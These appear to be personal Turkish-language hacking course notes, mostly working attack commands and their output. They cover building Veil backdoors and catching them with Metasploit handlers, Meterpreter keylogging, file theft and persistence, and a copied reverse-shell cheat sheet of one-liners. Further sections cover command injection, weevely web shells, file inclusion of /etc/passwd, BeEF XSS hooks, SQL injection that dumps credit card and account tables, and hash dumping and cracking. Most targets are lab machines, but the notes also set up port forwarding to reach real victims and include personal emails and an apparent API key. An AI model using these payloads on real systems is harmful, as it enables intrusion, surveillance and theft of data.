>use 26
>set LHOST 88.230.1.76
>generate 
>mv /var/lib/veil/output/compiled/qqq.exe /var/www/html/backdoors/
>cd /
>msfconsole
>use exploit/multi/handler
>set PAYLOAD windows/meterpreter/revese_http
>options
>set LHOST  192.168.202.147
>set LPORT 4444
>exploit 

modem ayarlarında port forwarding ayarı
google>192.168.1.1 > port forwarding 
extenral start and end port number should be your port that gave you backdoor 
internal host a da kendi ip ni ver kali ip ni 
mapping name de test de. 
kurban makinede google a 192.168.202.147/backddors yazarsan veya ordaki sayfadan backdooru indirip 
çalıştırırsan kalide session elde etmiş olursun
-------------------------------------------------------------------------------------


SAHTE OYUNLA DIŞ AĞ SALDIRILARI

digitalocean.com
eb sitesi kurmak için ve developmentle alakal ıişler yapmak için bize servisler sunan 
bir cloud şirketi

Tunahan Burak Dirlik
turbo_soft@hotmail.com
("O3xxx");

https://github.com/atilsamancioglu/2048
2048 i Downloads a yükledim



tunahan_burak@hotmail.com
("O3xxx");




------------
NO IP


dns servisi 
genelde static ve dinamik ip sorunlarını aşmak için kullanılıyor.

static ip değişmeyen ip


ama bizim amacımız domaine sahip olmak 


------------
meterpreter kullanımı


>use exploit/multi/handler

show options

set PAYLOAD windows/meterpreter/reverse_http

show options

set LHOST kali ip si

export    // burdan sonra karşı taraf gönderdiğimiz trojanı açmış olması lazım ondan sonra bağlantı kurulur.
 
sesion -l    //mevcut sessionları gösterir 

session -1

background //sesionı terminalde arka plana atar

session -1 // dersem session a geri döner 

sysinfo    //karşı tarafın sistem bilgilerini getirir.

help   //yapılabilecek tüm komutları gösterir.
-----------

işlem göçü

>ps //processleri programları gösterir.

>migrate <processnumber>

//yani çalışan backdooru pıd numaralı yere göçertiyoruz

//pıd ppıd

>ps

//suan backdoorun gözükmemesi lazım

-----------

önemli dosyaları çalmak 



>download dosya ismi


-----------
ekran kaydı alarak bilgileri toplamak

>keyscan_start
.
.
.
>keyscan_dump


screenshot almak

>screenshot

-----------
bağlantıyı sürdüreülebilir hale getirmek 
local persistence kullanacağız bunu kullanabilmek için hali hazırda
açık bir seesionımız olması lazım




meterpreeter>background   //diyerek sessionu arkaya atıp handler a geri dönüyoruz
msf exploit(handler)> use exploit/windows/local/persistence
msf exploit(persistence)> show options
msf exploit(persistence)> set EXE_NAME winexplore.exe
msf exploit(persistence)> set SESSION 1
msf exploit(persistence)> show advanced 
msf exploit(persistence)> set EXE::Custom /var/www/html/backdoors/payloadismi.exe  
msf exploit(persistence)> show advenced
msf exploit(persistence)> exploit
msf exploit(persistence)> use exploit/multi/handler
msf exploit(handler)> set PAYLOAD windows/meterpreter/reverse_http
msf exploit(handler)> show optipns
//hedef makine bilgisayarı kapatıp açsın
msf exploit(handler)> exploit
msf exploit(handler)> session -l
msf exploit(handler)> session -1
//bu noktada session açılmış olması lazım
meterpreter >pwd 











-------------------------------------------------------------------------------------

SHODAN

pip install shoadan

shodan başlatma 

shodan init JusdnNmQbRmjVnoaACl0Y4aMfSMd5EHl

zaafiyeti olan ip leri bulabilirsin

vsftpd 2.3.4

os:"Windows XP"

KENDİ PUBLİC İP Nİ BULMA 

shodan myip

nmap gibi kullanabilirsin

shodan host <ip>

-------------------------------------------------------------------------------------

WEB SİTESİ HACKLEMEK 

bir web sitesinin ip sini bulmak için maltegodan web sitesi bölümünden site ismini yazarak bulabilirsin
veya 

>ping web sitesi


google > netcraft : bu site de web siteleri hakkında açıklar bulmamızı sağlar 

--------------------

TERS İP ARAMASI // reverse ip

Google > YouGetSignal > AYNI IP LERİ KULLANAN DİĞER SİTELER NEDİR ONU ÇIKARIYOR
Bir sunucuda birden fazla web sitesi bulunabilir

--------------------

google > bing.com > ip: 107.180.51.79

ters ip kullanımının diğer şekli. O İp adresine kayıtlı bütün web sitelerini görmeni sağlar yougetsignal gibi  

yani bir ip üzerine kayıtlı web sitesini kayıtlı olan diğer web siteleri üzerinde açıklar bularak hackleyebiliriz.
Bunu önlemenin bir yolu gerçekten kendi sunucunu edinmendir.

--------------------

archieve.org

web sitelerinin geçmiş yıllardaki halini arşivleyen bir web sitesi
 

icann domainleri ip lere bağlayan uluslararaası bir şirket 

--------------------

google >whois lookup > icann 

whois look up ile web sitelerine ait ayrıntılı bilgileri yine öğrenebilirsin

--------------------

ROBOTS

robots.txt de adminler bizim bulmamızı istemediği dosyaları koyarlar
google bir site yapıldığı zaman o sitenin sahibi google ın kendi sitesi içinde 
gezinmesini yani indexlemesini ister fakat indexlemesini istemediği dosyaları 
robots.txt içine disallow şeklinde yazar bu dosya önemli.  


kullanımı

>dirb websitesi
outputlarda robotsçtxt çıkan siteye bakmamız lazım

--------------------

SUBDOMAINS

WEB SİTESİNDE BULAMADIĞIMIZ AÇIKLARI SUBDOMAİN ÜZERİNDE BULABİLİRİZ
-------
yükleme

>cd opt
>git clone https://github.com/TheRook/subbrute.git

subbruter ile sub domainleri bulabilirz

>python3 subbruter.py websitesi

-------------------------------------------------------------------------------------

KOD UYGULAMA AÇIĞI BULMA

//dvwa username: admin password : password

post ekranı içeren sitelerde yani bişey göndermeli sitelerde girdiyi verdikten sonra 

; koyup komut girersen çalışabilir

dvwa üzerinde örnek 

>192.168.202.149; ls

OUTPUT
----------------------------------------------------------------
PING 192.168.202.149 (192.168.202.149) 56(84) bytes of data.   |
64 bytes from 192.168.202.149: icmp_seq=1 ttl=64 time=0.013 ms |
64 bytes from 192.168.202.149: icmp_seq=2 ttl=64 time=0.061 ms |
64 bytes from 192.168.202.149: icmp_seq=3 ttl=64 time=0.018 ms |
                                                               |
--- 192.168.202.149 ping statistics ---                        |
3 packets transmitted, 3 received, 0% packet loss, time 1998ms |
rtt min/avg/max/mdev = 0.013/0.030/0.061/0.022 ms              |
help                                                           |
index.php                                                      |
source                                                         |
----------------------------------------------------------------

---------------------

açığı sömürme 

TERS TCP UYGULAMALARI

reverse chell commands 

netcat le bağlantı alabildiğimiz gibi dinleyebiliyoruz da

													REVERSE SHELL CHEAT SHEET
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
|
|If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.
|
|Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.
|
|The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.
|
|Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|Bash
|Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
|
|>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|PERL
|Here’s a shorter, feature-free version of the perl-reverse-shell:
|
|>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
|There’s also an alternative PERL revere shell here.
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|Python
|This was tested under Linux / Python 2.7:
|
|>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|PHP
|This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
|
|>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
|If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|Ruby
|>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|Netcat
|Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
|
|>nc -e /bin/sh 10.0.0.1 1234
|If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
|
|>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|Java
|r = Runtime.getRuntime()
|p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
|p.waitFor()
|[Untested submission from anonymous reader]
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
|xterm
|One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
|
|>xterm -display 10.0.0.1:1
|To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
|
|>Xnest :1
|You’ll need to authorise the target to connect to you (command also run on your host):
|
|>xhost +targetip
|
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


BAŞLAYALIM

kali terminalde 

>nc -vv -l -p 5050
//bu 5050 portumuzu dinlemeye başlar

web sitesinde 

192.168.202.147; php -r '$sock=fsockopen("192.168.202.147",5050);exec("/bin/sh -i <&3 >&3 2>&3");'
//kali ip				  kali ip	   port

-------başarısız olan girişim--------

kali terminalde 
>msfconsole
>use exploit/multi/handler
>set PAYLOAD windows/meterpreter/reverse_tcp
>set LHOST 192.168.202.147  //KALİ İP
>set LPORT 5050
>exploit 


web sitesinde

>192.168.202.147; php -r '$sock=fsockopen("192.168.202.147",5050);exec("/bin/sh -i <&3 >&3 2>&3");'

-------------------------------------

DOSYA YÜKLEME AÇIKLARI 



kali terminalde 
>weevely
>weevely generate 111111 /root/mynewconnect.php
		//password dosya yolu
>sitede dosyayı yükle sonra yüklendiğini gösteren adrese git boş sayfa görmen lazım

kali terminale gel

>weevely http://192.168.202.149/dvwa/vulnerabilities//hackable/uploads/mynewconnect.php 111111

session açılmış olması lazım

--------------------------------------

DOSYA BARINDIRMA AÇIKLARI 

URL KISMINA ARADIĞIMIZ DOSYA İSİMLERİNİ YAZARAK HİÇBİR ERİŞİMİMİZ OLMAMASINA RAĞMEN O WEB SERVERDAKİ İSTEDİĞİMİZ DOSYAYI GÖREBİLİRİZ İHİTMAL DAHİLİNDE YANİ


http://192.168.202.149/dvwa/vulnerabilities/fi/
http://192.168.202.149/dvwa/vulnerabilities/
http://192.168.202.149/dvwa/vulnerabilities/fi/?page=/etc/passwd    bu olmazsa aşağıdakini dene yine aynı sonucu verir. 

http://192.168.202.149/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
-------------------------------------------------------------------------------------
XSS AÇIKLARI (CROSS SİDE SCRİPTİNG)

siteye javascript kodu koymamıza olanak sağlar 
-----------------------
xss reflected

metasplıitable ın çalışıyor olması lazım 
firefox browserdan metasploitable makinesinin ip sine tıkla 
dwva ya git 
admin, password : şeklinde giriş yap 
securtiy leveli low yap kaydet
xss stored a gel 
 
kullanıcıdan bilgi alan bir yere

<script>alert("I HACK YOU ")<script>


post ettiğin zaman browserdaki linki kopyalayıp tekrar yapıştırdığında veya birine gönderdiğinde

ekranda alerte yazdığın yazı çıkar.
-----------------------
Stored xss 

yukardakinin başındaki ayarlarla devam et 

cd /
cd opt
cd beef
./beef
//hook kodunu al

firefox browserdan metasploit sayfaasına git dwva ya git 
giriş yap ayarlardan security leveli low seç
xss stored bölümüne git 
name bölümünü istediğin gibi doldur
message kısmına hook kodunu şu şekilde yapıştır sonra submit et 
<script src="http://192.168.202.147:3000/hook.js"></script>
//yukardaki ip kali ip si
firefoxdan beef arayüzüne gir hook olmuş olması lazım




-----------------------
xss den nasıl korunurum


tanımadığın bilmediğin sitelere tıklama

fakat stored xss yapılmış sitelerde ekranda alert çıkıyosa ona yapacak bişey yok herhangi bi yere tıklamadan kapat

chrome://settings/content/javascript?search=content+se

chrome da yukardaki yolu takip ederek  browserın javascript çalıştırmasını engelleyerek korunabilirsin ama siteler
düzgün çalışmayabilir.
---------------------------------------------------------------------------------

STRUCTERED QUERL LANGUAGE (SQL)

değer eklemek 

SELECT * FROM demo;
INSERT INTO demo (id,name, hint) VALUES (18, "JAMES", "GUITAR");

değer silmek 

SELECT * FROM demo;
DELETE * FROM demo WHERE name= "James";

değer güncellemek

>
SELECT *FROM demo;
INSERT INTO demo (id, name, hint) VALUES (21, "TUNAHAN, "TEST");

>
SELECT *FROM demo;

>
SELECT *FROM demo;
UPDATE demo SET id =23 WHERE name ="BURAK";

filtreleme

SELECT *FROM demo WHERE name LIKE "%TE";

|-----------------------------------------------------------------|
|SELECT * FROM demo;                                              |
|                                                                 |
|INSERT INTO demo (id, name, hint) VALUES (18, "James", "Guitar");|
|                                                                 |
|DELETE FROM demo WHERE name = "James";                           |
|                                                                 |
|UPDATE demo SET id = 18 WHERE name = "Atil";                     |
|                                                                 |
|SELECT * FROM demo WHERE name LIKE "%E";                         |
|-----------------------------------------------------------------|

---------------------------------------------------------------------------------
SQL INJECTION


metasploitable daki veri tabanları 

mysql -u root -h 192.168.202.149  //metasploitable ip si 
show databases
use mysql;
show tables;
select *from user;
.
.
.
mysql -u root -h 192.168.202.149
show databases;
use owasp10;
show tables;
select *from credit_cards
...

--------------------------
mutillidae veri tabanı

mutillidae sayfasına giremezsen ki ilk girişte giremeyeceksin büyük ihtimalle 

metasploitable makinesine gel

>sudo nano /var/www/mutillidae/config.inc

'metasploit' yazan yeri 'owasp10' olarak değiştir kaydet çık

mutillidae sayfasına girip kayıt olabilirsin
kayıt olup çıktıktan sonra giriş yaparken password kısmına ' atarak giriş yaparsan detaylı hata mesajı alırsın
bu kullanılabilir.
 
-------------------------

AÇIKLAR ARAMAK


username root
password dichead

SELECT * FROM accounts WHERE username ='root' AND password ='dickhead'   NORMALİ BU

SELECT * FROM accounts WHERE username ='root' AND password ='dickhead' AND 1=2#' BU GİRİŞ YAPMAZ

SELECT * FROM accounts WHERE username ='root' AND password ='dickhead' AND 1=1#' BU GİRİŞ YAPAR

kare işaretinde sonra gelen kodlar çalıştırılmıyor. eğer AND yazıp herhangi bir kod yazarsam ve sonuna #
koyarsam bu kod çalıştırılacak işte bu sql injection. giriş yaparken tırnaklar arasını alman gerekir.

-------------------------

SQL INJECTION POST METODU

Admin hesabıyla beğlanmaya çalışıp şifreye herhangi bir değer vererek bağlanmaya çalışacağız
şifre farketmeyecek çünkü sql yapacağız kodla gösterelim

SELECT * FROM accounts WHERE username='admin' AND password='1' OR 1=1#'
                                                           | PASSWORD |
diğer yolu

SELECT * FROM accounts WHERE username='admin'# AND password='1zdfhdgfnsfgn'
// username admin'#  password istediğini yaz

-------------------------

SQL INJECTION GET METTODU

mutillidae de see my account infosa gittiğinde username ve password bilgileri urlde gözüküyor url yi düzenlersek username den sonra '# koyarsak
o url yi tekrar browserda çalıştırdığımız zaman o bilgileri görmemiz gerekiyor ama çalışmayacak çünkü # koyduğunda html koduna çevrilmedi html koduna
çevirmek için # yerine %23 yazmamız gerekir. URL de parametre gördüğün takdirde bu sql açığını kullanmayı deneyebilirsin. En alltaki url çalışacaktır.

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=root2&password=dickhead2&user-info-php-submit-button=View+Account+Details 
http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=root2'#&password=dickhead2&user-info-php-submit-button=View+Account+Details
http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=root2'%23&password=dickhead2&user-info-php-submit-button=View+Account+Details

-------------------------

VERİTABANINDAKİ TÜM VERİLERİ ÇALMAK 

Account table ının içindeki tüm verileri ele geçirecez

SELECT * FROM accounts WHERE username='admin' UNION SELECT * FROM accounts# AND password='111111'

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=root2'union select*account%23&password=dickhead2&user-info-php-submit-button=View+Account+Details

-------------------------

VERİTABANI İSMİNİ ÖĞRENMEK 

SELECT * FROM accounts WHERE username='admin' order by 1# AND password='111111' OR 1=1#'

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details
http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'order by 10%23&password=123456&user-info-php-submit-button=View+Account+Details
http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'order by 5%23&password=123456&user-info-php-submit-button=View+Account+Details 
									        bu kısmı yani sayıyı deneye deneye sütun sayısını buluyoruz. 5 çalıştı demekki 5 doğru 5sütun var
http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details
2
3
4
sürunlarını döndürüyor inputu ona göre vermemiz gerekir .



veritabanı ismini öğrenmek 

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'union select 1, database(), user(), version(), 5%23&password=123456&user-info-php-submit-button=View+Account+Details

output
---
Username=owasp10
Password=root@localhost
Signature=5.0.51a-3ubuntu5

-------------------------

VERİTABANIMIZ İÇİNDEKİ TABLE NAME LERİNİ BULALIM

union select 1, table_name, null, null, 5 from information_schema.tables where table_schema = 'owasp10'

//owasp10 veritabanı içindeki veritabanı isimlerini bana göster demek.

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'union select 1, table_name, null, null, 5 from information_schema.tables where table_schema = 'owasp10'%23&password=123456&user-info-php-submit-button=View+Account+Details

outputta table namelerin sıralanması lazım

-------------------------

HERŞEYİ ELE GEÇİRMEK

union select 1, column_name, null, null, 5 from information_schema.columns where table_name = 'accounts'

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'union select 1, column_name, null, null, 5 from information_schema.columns where table_name = 'accounts'%23&password=123456&user-info-php-submit-button=View+Account+Details

son adım kullanıcı bilgilerini şifreleri falan hepsini alma 

union select 1, username, passwordd, is_admin, 5 from accounts

http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin'union select 1, username, passwordd, is_admin, 5 from accounts%23&password=123456&user-info-php-submit-button=View+Account+Details
---------------------------------------------------------------------------------
WEB SİTESİ PENTESTİNG ARAÇLARI 

SQLMAP e url vermek zorundayım

vullnerable mı öğrenmek  için

sqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details"

databaseleri görmek için

sqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details" --dbs

güncel kullanılan database i görmek için

sqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details" --current-db

güncel kullanılan database owasp10,bu database içindeki table ları görmek içim

ssqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details" --tables -D owasp10

credit card içindeki columsları getirmek için

sqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details" --columns -T credit_cards -D owasp10

verileri görmek için

sqlmap -u "http://192.168.202.149/mutillidae/index.php?page=user-info.php&username=admin&password=12345&user-info-php-submit-button=View+Account+Details" -T credi_cards -D owasp10 --dump

sqlmap --help

---------------------------------------------------------------------------------

ZAP

https://www.zaproxy.org/download/     burdan indir

terminalde 

cd Downloads/
chmod o+x ZAP_2_9_0_unix.sh
./ZAP_2_9_0_unix.sh

---------------------------------------------------------------------------------
PAROLA HASH KIRMA

PASSWORD CRACKING
ŞİFRE KIRMAYI ONLİNE VE OFFLİNE YAPABİLİYORUZ
HASHCAT, JOHN, HYDRA(WEB PENTESTING)  
 
LINUX HASHLERİ
root:$1$    bu hash in md5 olduğunu gösterir
root:$5$ veya 5s sha 256
root:$6$ sha 512

WİNDOWS HASHLERİ
DAHA GARİP ŞEKİLDE SAKLANIR ÖRENEK:

admin:500:B34CE522C3E4C87722C34254E51BFF62:FC525C9683E8FE067095BA2DDC971889::
USER  USERGROUP  LM GRUBU 14 KARAKTERDEN UZUNU ALMAZ		   NTLM GRUBU
500 ADMİN GRUBU  ESKİ OLAN 		   			   YENİ OLAN DAHA GÜVENLİ
-----------------------------------------------------------------------------------


METASPLOİTABLE ŞİFRESİ KIRMAK 

>msfconsole 
>use exploit/multi/misc/java_rmi_server 
>show payloads
>set payload java/meterpreter/reverse_tcp 
>show options 
>set RHOSTS 192.168.202.149    (metasploitable ip si)
>exploit 
//burdan itibaren meterpreter sessionı açılmış olması lazım
>session -l
>session -1
>ls (dosyaları görmek için)

>hashdump (bu çalışmazsa alttakini dene)
>run post/linux/gather/hashdump

	EXAMPLE OUTPUT
[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20200916000827_default_192.168.202.149_linux.hashes_006535.txt
-----------------------------------------------------------------------------------


KALİ DE ŞİFRELERİ HASH LERİ ALMAK

>cat/etc/passwd
>cat /etc/shadow   (BURDA PAROLALARIN HASHLENMİŞ HALİ VAR)
>unshadow
>unshadow /etc/passwd /etc/shadow 
//USAGE: unshadow PASSWORD-FILE SHADOW-FILE
//2 DOSYAYI DA PARAMETRE OLARAK İSTEYEN BİR KOMUT 
//>GOOGLE > LM AND NTLM GENERATOR (PAROLALARIN HASHİNİ ÜRETENE FAYDALI SAYFA)
-----------------------------------------------------------------------------------
HASH KIRMAK 

Hashcat kullanımı

hashcat -m mod <hashdosyası.txt> <dictionary>


Aşağıdakiler hangi os da hangi mod sayı kullanılıyor onu gösterir.
hashcat --help | grep md5
hashcat --help | grep 512

md5 Unix şifrelerinde kullanılan mod 500
sha512 Unix hashlerinde kullanılan mod 1800
windowsta NTLM hashlerinde kullanılan mod 1000


KALİDE BİRSÜRÜ WORDLİST VAR /USR/SHARE/WORDLİST/WORDLİSTLER BURADA
DİRB DİRBUSTER WEB PENTESTİNGDE KULLANILIR
fasttrack.txt ve rockyou.txt ctf lerde lazım olcak

-----------
BAŞLAYALIM
mykalihash.txt nin olduğu dosyay gideceğiz bende 

>cd Desktop
>ls
>hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt
//burada 1. paramatre hash      2. parametre dictionary

bu kadar.
-----------
//potfile sıkıntısı 
//daha önce aynı dosyayı veya hashi daha önce kırdıysan hashcat ben bunu daha önce kırdım şu dosyaya kaydettim git oraya 
//bak diyor. eğer baştan yapacaksan o dasyadakini sil diyor

//yani şöyle yapabilirsin
>hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt --show 
//veya 
>hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt --potfile-disable
-----------

-----------------------------------------------------------------------------------
ZİP ŞİFRELERİ KIRMAK

JOHN yüklemesi yapmamız lazım öncelikle bunun için
> apt-get install john
>cd Downloads/
>zip2john
>zip2john mysecret.zip
>zip2john mysecret.zip | cut -d ':' -f 2 > myzippass.txt
>cat myzippass.txt
>hashcat --help | grep Zip
>hashcat -m 13600 myzippass.txt /usr/share/wordlists/fasttrack.txt --potfile-disable

------
Direk kısayoldan halledelim uzatmadan bildiğimizi varsayalım

>zip2john mysecret.zip | cut -d ':' -f 2 > myzippass.txt
>hashcat -m 13600 myzippass.txt /usr/share/wordlists/fasttrack.txt --potfile-disable
-----------------------------------------------------------------------------------

				   NETWORK TEORİSİ

-----------------------------------------------------------------------------------
OPEN SYSTEM INTERCONNECTION - (AÇIK SİSTEM BAĞLANTILARI)

1--PHYSİCAL	--	DATA CABLES ETC.	
2--DATA		--	SWİTCCH MAC ADDRESS  (AYNI AĞDAKİ CİHAZLAR İÇİN)
3--NETWORK	--	ROUTE, IP ADDRESS    (FARKLI AĞLAR BİRBİRİNE BAĞLAR ROUTER)
4--TRANSPORT	--	TCP, UDP ..	     (VERİNİN TAŞIMA İŞLEMİ)
5--SESSION	--	COMMUNİCATİON	     (BAĞLANTI KURMAK)
6--PRESENTATİON	--	JPEG, MOV, DATA      (VERİNİ GÖRSELLEŞTİĞİ YER)
7--APPLİCATİON	--	HTTP, MAIL SERVER... (EN SON KATMAN)

-----------------------------------------------------------------------------------
IP ADDRESSES (LAYER 3) BINARY SİSTEMDİR

192     .168     .0       .1
11000000.10101000.00000000.00000001
8 BIT	 8 BIT	  8 BIT	   8 BIT	
-----------------------------------------------------------------------------------
COMPUTER SCIENCE

-->  MACHINE LANGUAGE	  --  10101...
-->  ASSEMBLY	          --  ARA FORM DİL
-->  HIGH LEVEL LANGUAGE  --  JAVA C C++ ...
-----------------------------------------------------------------------------------
BINARY SİSTEMİ ZATEN BİLİYORSUN

HEXADECIMAL SYSTEM
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
		    A  B  C  D  E  F
A4F6
10*16^3+4*16^2+15*16^1+6*16^0
40960  +1024  +240    +6
42230
-----------------------------------------------------------------------------------
IPV4 2^32  BINARY SYSTEM
IPV6 2^128 HEXADECIMAL SYSTEM
-----------------------------------------------------------------------------------
NAT (NETWORK ADDRESS TRANSLATION)

	  	 NETWORK NUMBERS - NETWORK MASK - HOST
CLASS A		 10.0.0.0          255.0.0.0      16777214
CLASS B 	 172.10.0.0        255.255.0.0    16634
CLASS C 	 192.168.0.0       255.255.255.0  254
LOOPBACK (LOCAL) 127.0.0.0         255.255.255.0

GENELDE OLMASI GEREKEN HOST SAYISI 256*(0 SAYISI)-2
İLK İP MODEME (GATEWAY) SON İP BROADCASTE (YAYIN İP Sİ) ATANIR
-----------------------------------------------------------------------------------
HOST HESAPLAMA 
CIDR Subnet Table

Subnet Mask	CIDR Prefix	Total IP	Usable IP ADD.  Number of /24 networks ADD.
255.255.255.255	/32		1		1		1/256th
255.255.255.254	/31		2		2*		1/128th
255.255.255.252	/30		4		2		1/64th
255.255.255.248	/29		8		6		1/32nd
255.255.255.240	/28		16		14		1/16th
255.255.255.224	/27		32		30		1/8th
255.255.255.192	/26		64		62		1/4th
255.255.255.128	/25		128		126		1 half
255.255.255.0	/24		256		254		1
255.255.254.0	/23		512		510		2
255.255.252.0	/22		1024		1022		4
255.255.248.0	/21		2048		2046		8
255.255.240.0	/20		4096		4094		16
255.255.224.0	/19		8192		8190		32
255.255.192.0	/18		16,384		16,382		64
255.255.128.0	/17		32,768		32,766		128
255.255.0.0	/16		65,536		65,534		256
255.254.0.0	/15		131,072		131,070		512
255.252.0.0	/14		262,144		262,142		1024
255.248.0.0	/13		524,288		524,286		2048
255.240.0.0	/12		1,048,576	1,048,574	4096
255.224.0 0	/11		2,097,152	2,097,150	8192
255.192.0.0	/10		4,194,304	4,194,302	16,384
255.128.0.0	/9		8,388,608	8,388,606	32,768
255.0.0.0	/8		16,777,216	16,777,214	65,536
254.0.0.0	/7		33,554,432	33,554,430	131,072
252.0.0.0	/6		67,108,864	67,108,862	262,144
248.0.0.0	/5		134,217,728	134,217,726	1,048,576
240.0.0.0	/4		268,435,456	268,435,454	2,097,152
224.0.0.0	/3		536,870,912	536,870,910	4,194,304
192.0.0.0	/2		1,073,741,824	1,073,741,822	8,388,608
128.0.0.0	/1		2,147,483,648	2,147,483,646	16,777,216
0.0.0.0		/0		4,294,967,296	4,294,967,294	33,554,432
----------------------------------------------------------------------------------
TCP VE UDP

TCP RELIABILITY  MAIL ALMA VERME
UDP HIZ	         VIDEO YAYINI HIZ GEREKTİREN APPLER
-----------------------------------
TCP NİN İLETİŞİM KURMA AŞAMALARI
3 YÖNLÜ EL SIKIŞMA
SYN-SYN ACK-ACK
SELAM VERME - SELAM ALMA - MUHABBET

TCP-------------UDP----------------
FTP    21	DHCP 67
SSH    22       SNMP 161
TELNET 23
SMTP   25
HTTP   80
HTTPS  443
POP3   110
IMAP   443
---------------------------------------------------------------------------------
CTF ÇÖZÜMLERİ  https://www.youtube.com/channel/UCnmAu7FF7LeoyTozrMVtTxQ

FAYDALI LİNKLER

https://www.kaspersky.com.tr/blog/category/privacy/

https://www.kaspersky.com.tr/blog/privacy-ten-tips-2018/5121/

https://www.kaspersky.com.tr/blog/anti-tracking-tools/5896/

https://thatoneprivacysite.net

https://freedom.press/training/

http://ozgurturanli.com/google-chrome-kullanicilari-phorm-belasindan-nasil-kurtulabilir/

https://network23.org/kame/tag/anonimlik/

https://www.youtube.com/watch?v=zZj63sVfgD8

